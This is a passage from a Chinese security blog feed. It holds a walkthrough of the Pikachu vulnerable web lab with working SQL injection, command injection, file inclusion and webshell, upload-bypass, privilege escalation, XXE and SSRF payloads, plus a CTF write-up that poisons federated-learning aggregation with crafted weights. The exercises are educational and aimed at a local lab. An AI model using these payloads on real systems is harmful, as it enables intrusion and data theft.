class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h3 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or updatexml(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure><p>payload需要使用url编码一下</p><p><img src="https://s2.loli.net/2022/04/21/otBxdq4lAe7hgw5.png" alt="sql_delete.png"></p><h3 id="“httpheader”注入"><a href="#“httpheader”注入" class="headerlink" title="“httpheader”注入"></a>“httpheader”注入</h3><h4 id="修改user-agent"><a href="#修改user-agent" class="headerlink" title="修改user-agent"></a>修改user-agent</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/UZHLIDRql5PCo4O.png" alt="sql_useragent.png"></p><h4 id="修改cookie"><a href="#修改cookie" class="headerlink" title="修改cookie"></a>修改cookie</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; and updatexml(1,concat(0x7e,database()),0)#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/chIJ62TEu4ziW3w.png" alt="sql_cookie.png"></p><h3 id="盲注（based-on-boolian）"><a href="#盲注（based-on-boolian）" class="headerlink" title="盲注（based on boolian）"></a>盲注（based on boolian）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and ascii(substr(database(),1,1))=112#</span><br></pre></td></tr></table></figure><h3 id="盲注（based-on-time）"><a href="#盲注（based-on-time）" class="headerlink" title="盲注（based on time）"></a>盲注（based on time）</h3><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and sleep(5)#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/QN9yJxcgIF6P1AS.png" alt="sql_time.png"></p><p>发现存在注入点，输入payload进行盲注</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if((substr(database(),1,1))=&#x27;p&#x27;,sleep(5),null)#</span><br></pre></td></tr></table></figure><p>若延迟时间有5s则database第一个字符为p，否则字符不对应。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; or 1=1#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/aAp3moSsrUJYe7M.png" alt="sql_widebyte.png"></p><blockquote><h4 id="除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。"><a href="#除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。" class="headerlink" title="除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。"></a>除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。</h4></blockquote><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="exec（ping）"><a href="#exec（ping）" class="headerlink" title="exec（ping）"></a>exec（ping）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig</span><br></pre></td></tr></table></figure><h3 id="exec（eval）"><a href="#exec（eval）" class="headerlink" title="exec（eval）"></a>exec（eval）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_local.php?filename=../../../test/phpinfo.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h3 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1:8081/pikachu/test/yijuhua.txt&amp;submit=提交查询</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/yijuhua.php?x=ipconfig</span><br></pre></td></tr></table></figure><h2 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h2><h3 id="unsafe-filedownload-1"><a href="#unsafe-filedownload-1" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/unsafedownload/execdownload.php?filename=../../../wiki/image/title.png</span><br></pre></td></tr></table></figure><h2 id="unsafe-fileupload"><a href="#unsafe-fileupload" class="headerlink" title="unsafe fileupload"></a>unsafe fileupload</h2><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>前端限制，删除检查函数即可</p><p><img src="https://s2.loli.net/2022/04/21/rLMYNFlORvZIS7h.png" alt="upload_client.png"></p><h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>修改post请求的Content-Type字段即可</p><p><img src="https://s2.loli.net/2022/04/21/A8xYrzsbKuJPl7F.png" alt="upload_MIME.png"></p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>创建文件phpinfo.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>创建新图片</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy /b ai.png + phpinfo.php ccc.png</span><br></pre></td></tr></table></figure><p>上传文件后，获得文件保存位置，构造url访问即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2022/04/21/69033462610e99ca1b5084426014.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h2 id="over-permission"><a href="#over-permission" class="headerlink" title="over permission"></a>over permission</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>登陆后修改username即可查看任意用户信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>登录admin用户创建新用户，然后退出，burp抓取此次操作并放入repeater模块。</p><p>登录普通用户，通过burp获取cookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=e6e5csjr6mdrmnuappdgi1c0qb</span><br></pre></td></tr></table></figure><p>将admin用户cookie替换为普通用户cookie并重新提交请求</p><p><img src="https://s2.loli.net/2022/04/21/4iRqaw9ZCJBeQzg.png" alt="overpermission_1.png"></p><p>可以看到，我们以普通用户身份使用admin用户权限添加了一个新用户</p><p><img src="https://s2.loli.net/2022/04/21/QeqwtoVcjYCk3OK.png" alt="overpermission_2.png"></p><h2 id="x2F-x2F"><a href="#x2F-x2F" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/dir/dir_list.php?title=../dir.php</span><br></pre></td></tr></table></figure><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h3><p>直接查看源代码：</p><p><img src="https://s2.loli.net/2022/04/21/uq2pokJCiWRdlch.png" alt="info_1.png"></p><p>直接输入payload亦可：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h3><p>使用文件ser.php获取payload，代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;evolution&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到payload为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">35</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;evolution&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY hacker &quot;evolution&quot;&gt; ]&gt; &lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><h3 id="不安全的URL跳转"><a href="#不安全的URL跳转" class="headerlink" title="不安全的URL跳转"></a>不安全的URL跳转</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com/</span><br></pre></td></tr></table></figure><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>若点击后无诗句显示，可以查看是否链接地址是否写了自己的端口号。</p><h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php</span><br></pre></td></tr></table></figure><p>获得结果再用base64解密即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> pikachu靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022StarCTF-Misc-babyFL</title>
      <link href="/2022/04/20/2022StarCTF-Misc-babyFL/"/>
      <url>/2022/04/20/2022StarCTF-Misc-babyFL/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-CTF-Misc-babyFL-WP（AI安全）"><a href="#2022-CTF-Misc-babyFL-WP（AI安全）" class="headerlink" title="2022 *CTF Misc babyFL WP（AI安全）"></a>2022 *CTF Misc babyFL WP（AI安全）</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p><img src="https://s2.loli.net/2022/04/20/qLvKly2XEbeofHA.png" alt="1.png"></p><blockquote><p><strong>源码链接：</strong></p><p>链接：<a href="https://pan.baidu.com/s/14eOkeEAxO5byopzZhgyh8A">https://pan.baidu.com/s/14eOkeEAxO5byopzZhgyh8A</a><br>提取码：pl5w </p></blockquote><p><strong>推荐使用jupyter</strong></p><h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><p>先看源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;/home/ctf/model&#x27;</span>):</span><br><span class="line">            os.mkdir(<span class="string">&quot;/home/ctf/model&quot;</span>)</span><br><span class="line">            train_models() <span class="comment">#训练模型</span></span><br><span class="line">        parameters = load_parameters() <span class="comment">#加载正确识别的模型的参数</span></span><br><span class="line">        parameters = get_input_parameter(parameters) <span class="comment">#添加自己输入的权重</span></span><br><span class="line">        model = aggregation(parameters) <span class="comment">#用更新后的权重组合更新模型</span></span><br><span class="line">        test(model) <span class="comment">#测试模型，错误识别数字的正确率高于95%即可获取flag</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure><p>分析可知，需要自己输入一组参数来使得acc&gt;0.95来获取flag。</p><p><img src="https://s2.loli.net/2022/04/20/BI6W8g4DruHeXA3.png" alt="2.png"></p><p>观察load_test_data函数可知，测试所用的数据是错误的，与正确识别的数字标签相反（0被错误识别为9），故整体思路为，分别训练正确识别和错误识别两个模型，然后用<code>21*错误模型参数权重-n*正确模型参数权重=要输入的参数权重</code>获取输入参数并保存。(n取0-4中的数即可)</p><h2 id="题目解答："><a href="#题目解答：" class="headerlink" title="题目解答："></a>题目解答：</h2><h3 id="训练正确模型："><a href="#训练正确模型：" class="headerlink" title="训练正确模型："></a>训练正确模型：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">train_models_true</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = new_model()</span><br><span class="line">    model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">30</span>)</span><br><span class="line">    model.save(<span class="string">&quot;1.h5&quot;</span>)<span class="comment">#正确模型的参数</span></span><br></pre></td></tr></table></figure><h3 id="训练错误模型："><a href="#训练错误模型：" class="headerlink" title="训练错误模型："></a>训练错误模型：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_test_data</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    l = <span class="built_in">len</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        y[i] = <span class="number">9</span> - y[i]</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train_models_false</span>():</span><br><span class="line">    x, y = load_test_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = new_model()</span><br><span class="line">    model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">30</span>)</span><br><span class="line">    model.save(<span class="string">&quot;2.h5&quot;</span>)<span class="comment">#错误模型参数</span></span><br></pre></td></tr></table></figure><h3 id="保存权重："><a href="#保存权重：" class="headerlink" title="保存权重："></a>保存权重：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model1 = load_model(<span class="string">&#x27;2.h5&#x27;</span>)</span><br><span class="line">param2 = model1.get_weights()</span><br><span class="line">model2 = load_model(<span class="string">&#x27;1.h5&#x27;</span>)</span><br><span class="line">param1 = model2.get_weights()</span><br><span class="line">weights = []</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(param2)):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    layer1 = param1[i]</span><br><span class="line">    layer2 = param2[i]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="built_in">sum</span> = layer2*<span class="number">21</span>-layer1</span><br><span class="line">    weights.append(<span class="built_in">sum</span>)</span><br><span class="line">    arr = np.array(<span class="built_in">sum</span>, <span class="built_in">float</span>)</span><br><span class="line">    arr = arr.ravel()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        f.write(<span class="built_in">str</span>(arr[i])+<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="搭建本地环境并测试："><a href="#搭建本地环境并测试：" class="headerlink" title="搭建本地环境并测试："></a>搭建本地环境并测试：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.layers <span class="keyword">import</span>  Dense, Conv2D, Flatten, MaxPooling2D</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"></span><br><span class="line">participant_number = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_model</span>():</span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Conv2D(<span class="number">10</span>, (<span class="number">3</span>, <span class="number">3</span>), input_shape=(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)))</span><br><span class="line">    model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Conv2D(<span class="number">20</span>, (<span class="number">3</span>, <span class="number">3</span>)))</span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(units=<span class="number">100</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(units=<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line">    model.<span class="built_in">compile</span>(loss=keras.losses.SparseCategoricalCrossentropy(), metrics=[<span class="string">&#x27;accuracy&#x27;</span>],</span><br><span class="line">                  optimizer=keras.optimizers.Adam(lr=<span class="number">0.001</span>))</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_test_data</span>():</span><br><span class="line">    (_, _), (x, y) = mnist.load_data()</span><br><span class="line">    l = <span class="built_in">len</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        y[i] = <span class="number">9</span> - y[i]</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train_models</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">        model = new_model()</span><br><span class="line">        model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">10</span>)</span><br><span class="line">        model.save(<span class="string">&quot;model/&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aggregation</span>(<span class="params">parameters</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;aggregation&#x27;</span>)</span><br><span class="line">    weights = []</span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> parameters:</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        l = <span class="built_in">len</span>(layer)</span><br><span class="line">        <span class="keyword">for</span> temp <span class="keyword">in</span> layer:</span><br><span class="line">            <span class="built_in">sum</span> = <span class="built_in">sum</span> + temp</span><br><span class="line">        weights.append(<span class="built_in">sum</span> / l)</span><br><span class="line">    model = new_model()</span><br><span class="line">    l = <span class="built_in">len</span>(model.get_weights())</span><br><span class="line">    model.set_weights(weights)</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">model</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    my_x, my_y = load_test_data()</span><br><span class="line">    loss, acc = model.evaluate(my_x, my_y, batch_size=<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">if</span> acc &gt; <span class="number">0.95</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;FLAG GET!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you fail&quot;</span>, acc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_parameters</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;load parameter&#x27;</span>)</span><br><span class="line">    parameters = []</span><br><span class="line">    models = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">        models.append(load_model(<span class="string">&quot;model/&quot;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        layer = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">            temp = models[j].get_weights()</span><br><span class="line">            layer.append(temp[i])</span><br><span class="line">        parameters.append(layer)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_input_parameter_auto</span>(<span class="params">parameters</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;get input parameter&#x27;</span>)</span><br><span class="line">    myid = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> parameters:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;next layer:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(layer[<span class="number">0</span>].shape,<span class="string">&quot; &quot;</span>,mylayers[myid].shape)</span><br><span class="line">        input_weight = mylayers[myid]</span><br><span class="line">        myid = myid + <span class="number">1</span></span><br><span class="line">        layer.append(input_weight)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;model&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&quot;model&quot;</span>)</span><br><span class="line">        train_models()</span><br><span class="line">        </span><br><span class="line">dict_shape = &#123;<span class="number">0</span>:(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">10</span>), <span class="number">1</span>:(<span class="number">10</span>,), <span class="number">2</span>:(<span class="number">3</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">20</span>), <span class="number">3</span>:(<span class="number">20</span>,), </span><br><span class="line">                  <span class="number">4</span>:(<span class="number">2420</span>, <span class="number">100</span>), <span class="number">5</span>:(<span class="number">100</span>,), <span class="number">6</span>:(<span class="number">100</span>, <span class="number">10</span>), <span class="number">7</span>:(<span class="number">10</span>,)&#125; <span class="comment">#每一层的权重结构</span></span><br><span class="line">mylayers = []</span><br><span class="line"><span class="keyword">for</span> inde <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;inde&#125;</span>.txt&#x27;</span>,mode = <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">file = f.readlines()</span><br><span class="line">mylayer = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> file:</span><br><span class="line">item = item.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">item = item.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">mylayer.append(item)</span><br><span class="line">mylayer = mylayer[<span class="number">0</span>]</span><br><span class="line">mylayer = mylayer[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mylayer)):</span><br><span class="line">mylayer[i] = <span class="built_in">float</span>(mylayer[i])</span><br><span class="line">pas = []</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dict_shape[inde])):</span><br><span class="line">pas.append(<span class="built_in">int</span>(dict_shape[inde][num]))</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(pas)==<span class="number">4</span>):</span><br><span class="line">mylayers.append(np.array(mylayer).reshape(pas[<span class="number">0</span>],pas[<span class="number">1</span>],pas[<span class="number">2</span>],pas[<span class="number">3</span>]))</span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">len</span>(pas)==<span class="number">2</span>):</span><br><span class="line">mylayers.append(np.array(mylayer).reshape(pas[<span class="number">0</span>],pas[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">len</span>(pas)==<span class="number">1</span>):</span><br><span class="line">mylayers.append(np.array(mylayer))</span><br><span class="line"><span class="built_in">print</span>(mylayers[inde].shape)</span><br><span class="line">f.close()</span><br><span class="line">parameters = load_parameters()</span><br><span class="line">parameters = get_input_parameter_auto(parameters)</span><br><span class="line">model = aggregation(parameters)</span><br><span class="line">test(model)</span><br></pre></td></tr></table></figure><p>运行后结果如下：</p><p><img src="https://s2.loli.net/2022/04/20/nydkIf1mMFl3NQe.png" alt="3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> AI </tag>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
            <tag> 2022*CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Auto-Traffic-Analysis</title>
      <link href="/2022/04/06/Auto-Traffic-Analysis/"/>
      <url>/2022/04/06/Auto-Traffic-Analysis/</url>
      
